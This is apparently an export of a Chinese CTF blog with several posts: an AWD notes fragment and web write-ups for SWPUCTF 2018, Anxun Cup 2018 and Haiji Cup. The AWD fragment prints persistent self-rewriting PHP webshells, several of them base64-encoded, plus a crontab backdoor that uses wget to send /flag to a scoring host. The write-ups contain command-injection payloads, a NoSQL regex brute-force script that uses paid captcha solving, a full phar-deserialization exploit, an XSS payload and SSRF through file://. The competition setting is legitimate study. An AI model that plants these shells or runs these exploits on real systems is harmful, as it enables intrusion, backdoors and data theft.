cCg1KTsKICAgICAgICAgICAgfX0KICAgICAgICAgICAgPz4=&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// base64 decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt;&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);// decodesystem(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;$code_template = &quot;&lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;; $shell = base64_decode(&apos;&lt;?phpif(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)&#123; @system($_REQUEST[&quot;moxiaoxi666&quot;]);&#125;Cj8+&apos;); unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?&gt;&quot;;file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;); 3: 种crontab后门定时交flag 12345system(&apos;/bin/echo mo123;/bin/echo KiAqICogKiAqIC91c3IvYmluL3dnZXQgImh0dHA6Ly8xOTIuMTY4LjIwMC4xNTA6ODAwNS9hcGkvdGVhbS9zdWJtaXQvL2MxMzYyODI2MjI5M2M1ODVlYmZhZDM3Y2ExYzVlNzdkNDI4ZjVkY2QiIC1kICImZmxhZz0kKC9iaW4vY2F0IC9mbGFnKSIgLUggIkNvb2tpZTpkZGFhcyIK | /usr/bin/base64 -d | /bin/cat &gt;&gt; /tmp//tmp.conf ; /usr/bin/crontab /tmp//tmp.conf;/bin/echo xiaoxi456890&apos;);decode base64* * * * * /usr/bin/wget &quot;http://192.168.200.150:8005/api/team/submit//c13628262293c585ebfad37ca1c5e77d428f5dcd&quot; -d &quot;&amp;flag=$(/bin/cat /flag)&quot; -H &quot;Cookie:ddaas&quot; 4 1234567891011121314151617system%28%27%2Fbin%2Fecho+HENCE666%3B%2Fbin%2Fecho+PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw%2FcGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30%2FPic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk%2FPg%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fvar%2Fwww%2Fhtml%2F%2F--8f02938e9d21e67bfc87240f584d6443.php%3B%2Fbin%2Fecho+ZHANG777%27%29%3B// decodesystem(&apos;/bin/echo HENCE666;/bin/echo PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw/cGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30/Pic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk/Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;);// decode base64system(&apos;/bin/echo HENCE666;/bin/echo &lt;?php ignore_user_abort(true); set_time_limit(0); $file = &quot;--8f02938e9d21e67bfc87240f584d6443.php&quot;; $shell = &apos;&lt;?php if($_REQUEST[hash]==&quot;f9b69a096514f282128935fd077f2ebb&quot;)&#123;$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);&#125;?&gt;&apos;; unlink(__FILE__); while (TRUE) &#123;&#123; if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125; usleep(5); &#125;&#125; ?Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;); 5 1234567891011121314151617%24path+%3D+%27%2Fhome%2Fteam%2Fworkdir%2Fskin%2F--ssssss.php%27%3B%24data+%3D+%27PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw%2FcGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs%2FPiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA%2FPg%3D%3D%27%3B%24data%3D+base64_decode%28%24data%29%3B%40file_put_contents%28%24path%2C%24data%29%3Bsystem%28%27chmod+500+%27.%24path%29%3Bsystem%28%27%27rm+%29// deocde$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw/cGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs/PiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA/Pg==&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm )// base64 decode$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;&lt;?php ignore_user_abort(true); set_time_limit(0); while (1)&#123; $path = &quot;/home/team/workdir/skin/.ssssss.php&quot;; $data = &quot;&lt;?php if(md5(\$_POST[&apos;pass&apos;])==&apos;c2721d836ddb686b0b01cb0066089950&apos;)@eval(\$_POST[&apos;cmd&apos;]);?&gt;&quot;; @file_put_contents($path, $data); system(&apos;chmod 500 &apos;.$path); usleep(100); &#125; ?&gt;&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm ) 删、覆盖上传目录的.htaccess 1GET //libraries/lithium/template/view/Compiler.php?along=system(&apos;/bin/echo mo123;rm /home/team/workdir/app/webroot/uploads/.htaccess;/bin/echo xiaoxi456890&apos;); 还有个没看懂的ip：192.168.17.11 123456789101112131415%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Becho%20%22d32d8%22%3B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3Becho%20%221d77b%22%3Bdie()%3B//decode@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);echo &quot;d32d8&quot;;$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);$R=&quot;&#123;$D&#125; &quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123; foreach(range(&quot;C&quot;,&quot;Z&quot;)as$L) if(is_dir(&quot;&#123;$L&#125;:&quot;) )$R.=&quot;&#123;$L&#125;:&quot;;&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot; &quot;;$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot; &#123;$s&#125;&quot;;echo $R;;echo &quot;1d77b&quot;;die(); Nu1l的shell1：192.168.21.x 123456789101112131415file_put_contents(&apos;Nu1ls.php&apos;,base64_decode(&quot;PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl1bmxpbmsoX19GSUxFX18pOwoJd2hpbGUoMSl7CgkJZmlsZV9wdXRfY29udGVudHMoJy4vLm51MWxjdGZzLnBocCcsICc8P3BocCBAZXZhbCgkX0dFVFsnbnVsbCddKTsnKTsKCQlzeXN0ZW0oJ2NobW9kIDc3NyAuY29uZmlnLnBocCcpOwkJCQkJCgkJLy/mjIHnu63lnKhjb25maWcucGhw5Lit5YaZ5YWlCgkJdG91Y2goIi4vLm51MWxjdGZzLnBocCIsIG1rdGltZSgyMCwxNSwxLDExLDE3LDIwMTcpKTsJCgkJdXNsZWVwKDEwMCk7Cgl9Cj8+Cg==&quot;))base64解码：&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1)&#123; file_put_contents(&apos;./.nu1lctfs.php&apos;, &apos;&lt;?php @eval($_GET[&apos;null&apos;]);&apos;); system(&apos;chmod 777 .config.php&apos;); touch(&quot;./.nu1lctfs.php&quot;, mktime(20,15,1,11,17,2017)); usleep(100); &#125;?&gt; Nu1l的shell2：123456file_put_contents%28%22Nu1ls.php%22%2Cbase64_decode%28%22PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs%2FPg%3D%3D%22%29%29%3B&amp;zzz=aaa//decodefile_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs/Pg==&quot;));&amp;zzz=aaa//file_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;&lt;?php @eval($_POST[&apos;homaebic&apos;]);?&gt;&quot;));&amp;zzz=aaa final最后还有一些骚套路，等考完试写好awd框架了一起分享出来~]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SWPUCTF WEB Writeup]]></title>
    <url>%2F2018%2F12%2F20%2FSwpu%20CTF%202018%20Writeup%2F</url>
    <content type="text"><![CDATA[WEb 1:用优惠码 买个 X ?www.zip源码泄露：123456789101112131415161718192021222324252627&lt;?php//生成优惠码$_SESSION[&apos;seed&apos;]=rand(0,999999999);function youhuima()&#123; mt_srand($_SESSION[&apos;seed&apos;]); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; setcookie(&apos;Auth&apos;, $auth);&#125;//support if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123; if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123; //执行命令 &#125;else &#123; //flag字段和某些字符被过滤! &#125; &#125;else&#123; // 你的输入不正确! &#125;?&gt; 登录后，题目给了我们15位的优惠码，而购买X的优惠码是24位的，再回过来看看代码，很明显考察php随机数安全问题。 这篇文章分析的不错：http://wonderkun.cc/index.html/?p=585 简单而言，生成优惠码的每一位字母(数)使用的随机数种子相同，即php在产生一系列随机数的时候只进行了一次播种。而在linux64位的系统中rand()和mt_rand()函数产生的最大随机数都是2^31-1，所以在这个范围内可以爆破。 最初想着直接用php爆破：1234567891011121314151617181920212223242526&lt;?phperror_reporting(E_ALL);//生成优惠码function youhuima($seed)&#123; mt_srand($seed); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; if($auth === &quot;9vmnye6GT7TpzH3&quot;)&#123; echo $seed; exit(); &#125;&#125;for($i=1; $i&lt;999999999; $i++)&#123; youhuima($i);&#125; 结果卡了很久很久 cpu爆炸.. 后来发现已经有大牛写了一个c语言爆破种子的程序：http://www.openwall.com/php_mt_seed/ 这里踩了很多坑… 4.0版本make编译报错，3.4的版本跑出来的种子死活都不对.. 后来仔细分析，这个和php版本相关：3.4的爆破脚本中描述： 然鹅我们题目是php7.2的版本 所以这里只能用4.0的爆破程序。 先将字母转换成对应的数字：123456789101112function getseed()&#123; $str = &quot;8zJag6b&quot;; $randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; for($i=0;$i&lt;strlen($str);$i++)&#123; $pos = strpos($randStr,$str[$i]); echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;; //整理成方便 php_mt_seed 测试的格式 //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] &#125; echo &quot;\n&quot;;&#125; 然后爆破： 拿到种子后，记得在本地将php版本调到7.1+，生成24位的优惠码123456789101112131415function youhuima()&#123; mt_srand(&apos;727588335&apos;); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=24; for ( $i = 0; $i &lt; $len; $i++ )&#123; if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); &#125; echo $auth; echo &quot;\nsJO5ciqR&quot;; setcookie(&apos;Auth&apos;, $auth);&#125; 接着考察命令执行的漏洞：preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)m修饰符：换行匹配，所以构造payload：ip=| ls%0a127.0.0.1 这里可以用pcre_match贪婪匹配特性绕过？参考 第二层：用\或者””绕关键字即可ip=| c&quot;&quot;at /f&quot;&quot;lag%0a127.0.0.1 拿到flag:swpuctf{**08067_sec**$$%@!~~~~**} Web2:提示phpinfo:看到了mangodb，猜想这是nosql注入这里$ne在mongodb中表示：!=、&lt;&gt; /check.php?username[$ne]=%5C&amp;password[$ne]=%5C&amp;vertify=zxvz即表示用户名不为\且(or)密码不为\的用户。根据提示，可以猜想到密码就是flag 所以可以用$regex模糊查询 参考：https://www.freebuf.com/articles/database/95314.html 爆密码payload：?username[$ne]=1&amp;password[$regex]=^s&amp;vertify=h36f爆账号payload：?username[$regex]=1&amp;password[$ne]=1&amp;vertify=h36f 然后就是验证码爆破了，花上5毛钱接入打码平台： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# coding:utf-8import requestsfrom hashlib import md5import jsonimport time# swpuCTF验证码爆破# Manggodb爆破payload = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^%s&amp;vertify=%s&quot;url_vertify = &quot;http://123.206.213.66:45678/vertify.php&quot;s = requests.Session()proxies = &#123; &quot;http&quot;: &quot;127.0.0.1:8080&quot;&#125;class RClient(object): def __init__(self, username, password, soft_id, soft_key): self.username = username self.password = md5(password).hexdigest() self.soft_id = soft_id self.soft_key = soft_key self.base_params = &#123; &apos;username&apos;: self.username, &apos;password&apos;: self.password, &apos;softid&apos;: self.soft_id, &apos;softkey&apos;: self.soft_key, &#125; self.headers = &#123; &apos;Connection&apos;: &apos;Keep-Alive&apos;, &apos;Expect&apos;: &apos;100-continue&apos;, &apos;User-Agent&apos;: &apos;ben&apos;, &#125; def rk_create(self, im, im_type, timeout=60): &quot;&quot;&quot; im: 图片字节 im_type: 题目类型 &quot;&quot;&quot; params = &#123; &apos;typeid&apos;: im_type, &apos;timeout&apos;: timeout, &#125; params.update(self.base_params) files = &#123;&apos;image&apos;: (&apos;a.jpg&apos;, im)&#125; r = requests.post(&apos;http://api.ruokuai.com/create.json&apos;, data=params, files=files, headers=self.headers) return r.json() def rk_report_error(self, im_id): &quot;&quot;&quot; im_id:报错题目的ID &quot;&quot;&quot; params = &#123; &apos;id&apos;: im_id, &#125; params.update(self.base_params) r = requests.post(&apos;http://api.ruokuai.com/reporterror.json&apos;, data=params, headers=self.headers) return r.json()def get_time(): now_time = time.strftime(&quot;%H:%M:%S&quot;, time.localtime()) return now_timedef getvertify(): res = s.get(url=url_vertify) file_name = &apos;1.png&apos; with open(file_name, &apos;wb&apos;) as file: file.write(res.content) file.flush() file.close() # print(&quot;[+] 图片下载完成，正在进行图片识别&quot;) rc = RClient(&apos;username&apos;, &apos;pwd&apos;, &apos;keyid&apos;, &apos;key&apos;) im = open(&apos;1.png&apos;, &apos;rb&apos;).read() vertify = rc.rk_create(im, 3040)[&apos;Result&apos;] print(&quot;[+] 识别成功： %s&quot; % str(vertify)) return vertifydef getflag(): global s str_base = &quot;sabcdefghijklmnopqrtuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot; # /-+=.~`!@%^*()[]&#123;&#125;|\;:&apos;\&quot;,&lt;&gt;?&quot; i = 0 j = 0 pwd = &quot;&quot; flag = &quot;&quot; while i &lt; 30: while j &lt; len(str_base): pwd = flag + str_base[j] verify = str(getvertify()) exp = payload % (pwd, verify) url = exp res = s.get(url, proxies=proxies) print(&quot;[*] %s Current payload:%s&quot; % (get_time(), exp)) if &quot;wrong CAPTCHA&quot; in res.text: print(&quot;[-] %s %s&quot; % (get_time(), res.text)) continue elif &quot;username or password incorrect&quot; in res.text: print(&quot;[-] %s %s&quot; % (get_time(), res.text)) j = j+1 else: flag = pwd print(&quot;[-] %s %s&quot; % (get_time(), res.text)) break #time.sleep(1) j=0if __name__ == &apos;__main__&apos;: getflag() web3考点phar反序列化，源码没有unserialize反序列化操作的函数，这是最近blackhat上一个热门议题，phar反序列化。利用点条件： 能将打包好的phar文件上传(扩展名,文件头都可以伪造) 存在文件操作函数：1fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize 具体详细介绍看hpdog师傅的文章：https://www.anquanke.com/post/id/159206#h3-17 这个题的攻击链的构造有一点点小复杂。 先纵观class.php中的三个类： C1e4类中的析构函数有一个echo操作 Show类中有__toString()魔术方法 show类中的__toString() 中有$this-&gt;str[&#39;str&#39;]-&gt;source;这样一个操作。 Test类中有__get()魔术方法，调用私有属性，或者不存在的属性时会触发。 Test类中get()方法会用file_get_contents()读取文件 file.php中有文件操作的函数:file_exists() 所以思路就是：用Test类中get()读到flag文件，用C1e4类中的echo输出结果。 而中间的过程即：我们先将三个类分别new一遍。将show的实例化对象赋值给C1e4r类的$str，使得show对象被echo出来，从而调用show类中的__toString方法。然后我们将show方法中的$this-&gt;str[&#39;str&#39;]赋入test对象，这样就会调用test中的source变量，这个变量不存在，所以触发Test类中的__get()魔术方法，其次Test类的$params要赋值成一个数组键为source，值为flag路径。 即：123456789$a = new Test();$a-&gt;params = [ &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;];$b = new Show();$b-&gt;str[&apos;str&apos;] = $a;$c = new C1e4r();$c-&gt;str = $b; 完整payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; echo $this-&gt;source; &#125; public function __toString() // 类被当成字符串回应的方法 &#123; $content = $this-&gt;str[&apos;str&apos;]-&gt;source; return $content; &#125; public function __set($key,$value) // 设置一个类的成员变量时调用 &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) &#123; // 防ssrf等等？ die(&apos;hacker!&apos;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() // 执行unserialize()先调用这个，这里用phar来进行调用 &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); // 读flag:f1ag.php return $text; &#125;&#125;$a = new Test();$a-&gt;params = [ &apos;source&apos;=&gt; &apos;/var/www/html/f1ag.php&apos;];$b = new Show();$b-&gt;str[&apos;str&apos;] = $a;$c = new C1e4r();$c-&gt;str = $b;$phar = new Phar(&quot;passer6y.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c);$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;Passer6y&quot;);$phar-&gt;stopBuffering();?&gt; WEB 4玩的时候xssbot挂了.. 这里考察filter_var函数校验绕过payload:email=&quot;&lt;script\ src=https://*.exeye.io/swpu&gt;&lt;/script&gt;&quot;@qq.com&amp;submit= 123456789101112&lt;!--check.phpif($_POST[&apos;email&apos;]) &#123; $email = $_POST[&apos;email&apos;]; if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123; echo &quot;error email, please check your email&quot;; &#125;else&#123; echo &quot;等待管理员自动审核&quot;; echo $email; &#125;&#125;?&gt;--&gt;]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安洵杯2018-WebN出题记录]]></title>
    <url>%2F2018%2F12%2F01%2F%E5%AE%89%E6%B4%B5%E6%9D%AF2018-WebN%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[出题思路考点，同源代码执行(Some攻击)，一个jsonp接口，搞不了xss，获取不了信息，但是能回调调用js函数，这样就可以Bypass csrf token了~ 漏洞点： 礼品中心处：怎么购买 怎么充值都是失败的。 分析js代码：在reward.php中点击富萝莉后，会用iframe加载confirm.php的文件 跟进confirm.php一个jsonp的回调接口， 跟进接口jsonp接口，字符实体编码，搞不了反射型xss。 回过头来看reward.php，这里有一个提示： 点击之后，怎么也提示钱不够，而且还有token的验证。 这里思路就很清晰了，csrf 绕token，配合首页的富萝莉客服，让客服点击链接，帮你购买商品 不难想到，肯定就是some攻击调用reward.php中的pay()函数了 exp: 自动测试爬虫： 视频demo：]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[骇极杯Web Writeup]]></title>
    <url>%2F2018%2F11%2F07%2F%E9%AA%87%E6%9E%81%E6%9D%AFWeb%20Writeup%2F</url>
    <content type="text"><![CDATA[web1这题考察ssrf。robots.txt中提示有两个文件： source.php flag.php显然一个是源码一个是flag。 这里还考察了一个点，php获取ip的绕过，这里x-client-ip即可绕过。![@JMXBRS[UGCT}~}FG2`}2T.png-69.6kB常见的修改http请求头伪造ip的方法有： X_FORWARDED_FOR Client-IP x-client-ip 然后让我们加上url参数请求i春秋的官网：url=http://www.ichunqiu.com 而且每次请求都发现文件名在变，然后返回的东西里面还有;号，开始以为是考nginx的解析漏洞。后来一想不可能无缘无故给url参数，可能是指定url，然后把读取到的文件写到图片里面。后来看到sn00py师傅测试url=//www.ichunqiu.com的时候发现，再去访问图片的响应码就变成200了。 然后想到用file协议去绕url限制： 读flag web2题目源码：12345678910111213141516171819202122232425262728&lt;?php //error_reporting(0); //$dir=md5(&quot;icq&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); //$dir=md5(&quot;icq&quot;); //$sandbox = &apos;/var/sandbox/&apos; . $dir; //@mkdir($sandbox); //@chdir($sandbox); if($_FILES[&apos;file&apos;][&apos;name&apos;])&#123; $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;]; if (!is_array($filename)) &#123; $filename = explode(&apos;.&apos;, $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(&quot;emmmm...&quot;); &#125; $new_name = (string)rand(100,999).&quot;.&quot;.$ext; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name); $_ = $_POST[&apos;hehe&apos;]; if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos; &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); &#125; unlink($new_name); &#125; else&#123; highlight_file(__FILE__); &#125; 上传页，抓包用： 正常解法,先绕end()和$filename[count($filename) - 1]的差异，然后end是取最后一个插入的元素，后者是取索引中的最后一个，然后我们上传的时候给file变量传数组就不会进入explode截断，这样就可以绕过：123if($ext==$filename[count($filename) - 1])&#123; die(&quot;emmmm...&quot;);&#125; 接着后面是给文件名重命令三位随机数，并且hehe参数不能包含这个随机重命名的上传文件。这里参考 http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html 